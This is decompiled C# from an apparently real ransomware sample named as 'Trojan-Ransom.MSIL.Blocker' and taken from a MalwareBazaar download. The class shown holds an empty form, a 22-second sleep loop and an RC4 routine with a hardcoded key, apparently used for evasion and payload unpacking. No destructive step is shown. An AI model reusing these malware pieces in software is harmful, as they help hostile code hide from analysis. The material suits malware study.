// Decompiled with JetBrains decompiler
// Type: Mauiipecjzet.Form2
// Assembly: NVC, Version=1.27.2835.6155, Culture=neutral, PublicKeyToken=null
// MVID: D6059D47-04E7-4246-B192-8DA3183DE0D7
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.06-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-412b77a6a5c1b510f076d010e81749e9a13ebc9b33125d5caa764e78180a28a4.exe

using System.ComponentModel;
using System.Drawing;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Mauiipecjzet
{
  public class Form2 : Form
  {
    private IContainer components;

    public Form2() => this.InitializeComponent();

    public void One()
    {
      for (int index = 0; index < 22; ++index)
        Thread.Sleep(1000);
    }

    private byte[] Encrypt(byte[] data)
    {
      int[] numArray1 = new int[256];
      int[] numArray2 = new int[256];
      byte[] numArray3 = new byte[data.Length];
      byte[] bytes = Encoding.UTF8.GetBytes("Pszkyrelyplsmf");
      for (int index = 0; index < 256; ++index)
      {
        numArray1[index] = (int) bytes[index % bytes.Length];
        numArray2[index] = index;
      }
      int index1;
      for (int index2 = index1 = 0; index1 < 256; ++index1)
      {
        index2 = (index2 + numArray2[index1] + numArray1[index1]) % 256;
        int num = numArray2[index1];
        numArray2[index1] = numArray2[index2];
        numArray2[index2] = num;
      }
      int num1;
      int index3 = num1 = 0;
      int index4 = num1;
      int index5 = num1;
      for (; index3 < data.Length; ++index3)
      {
        index5 = (index5 + 1) % 256;
        index4 = (index4 + numArray2[index5]) % 256;
        int num2 = numArray2[index5];
        numArray2[index5] = numArray2[index4];
        numArray2[index4] = num2;
        int num3 = numArray2[(numArray2[index5] + numArray2[index4]) % 256];
        numArray3[index3] = (byte) ((uint) data[index3] ^ (uint) num3);
      }
      return numArray3;
    }

    public byte[] Decrypt(byte[] data) => this.Encrypt(data);

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(646, 273);
      this.Name = nameof (Form2);
      this.Text = nameof (Form2);
      this.ResumeLayout(false);
    }
  }
}
